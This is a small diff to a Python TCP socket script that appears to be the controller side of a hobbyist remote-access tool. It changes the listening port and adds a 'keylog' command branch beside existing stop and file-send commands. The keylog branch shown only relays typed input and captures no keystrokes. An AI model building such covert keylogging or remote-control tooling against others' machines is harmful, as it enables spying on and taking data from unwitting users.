@@ -6,7 +6,7 @@ identifier = "<END OF FILE>"
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 #okay so s is for creating a socket obj for ip 4 and tcp
 ip = "192.168.18.145"
-port = 9000
+port = 8000
 #this is my ip and i am using port 9000 on my own
 address = (ip,port)
 s.bind(address)
@@ -31,6 +31,19 @@ try:
         if message.decode() == "STOP":
             break
 
+
+        # for starting keyloggg
+        if message.decode() == "keylog":
+            print("key logging")
+            while True:
+                mess = input("type stop:")
+                s.send(mess.encode())
+                if mess == "stop":
+                    break
+            continue
+
+
+            #for sending message to the client
         if message.decode().startswith("send"):
             print("Sending file")
             filename = message.decode().strip("send ")
